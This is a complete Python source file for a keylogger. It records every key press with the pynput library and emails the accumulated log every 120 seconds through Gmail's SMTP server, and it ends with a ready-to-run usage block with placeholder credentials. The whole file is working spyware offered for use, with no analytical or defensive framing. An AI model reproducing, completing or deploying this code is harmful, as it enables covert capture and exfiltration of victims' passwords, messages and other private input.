import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, interval, email, app_password):
        self.interval = interval  # Interval in seconds for sending logs
        self.log = "Keylogger Started...\n"
        self.email = email  # Your email address
        self.app_password = app_password  # App password generated for your email

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)  # Get the character of the key
        except AttributeError:
            if key == key.space:
                current_key = " "  # Replace space key with space character
            else:
                current_key = " [" + str(key) + "] "  # Format special keys
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.app_password, "\n\n" + self.log)  # Send email with log
        self.log = ""  # Clear log
        timer = threading.Timer(self.interval, self.report)  # Set timer for next report
        timer.start()  # Start timer

    def send_mail(self, email, app_password, message):
        global server
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)  # SMTP server address and port
            server.starttls()  # Start TLS encryption
            server.login(email, app_password)  # Login to email server
            server.sendmail(email, email, message)  # Send email to self
        except Exception as e:
            print(f"Failed to send email: {e}")
        finally:
            server.quit()  # Quit server

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)  # Start listener
        with keyboard_listener:
            self.report()  # Start reporting
            keyboard_listener.join()  # Join listener


# Example usage:
if __name__ == "__main__":
    # Replace with your own email and app password
    my_email = "your_email@gmail.com"
    my_app_password = "your_generated_app_password"  # Replace with your app password

    my_keylogger = Keylogger(120, my_email, my_app_password)  # Create keylogger object
    my_keylogger.start()  # Start keylogger
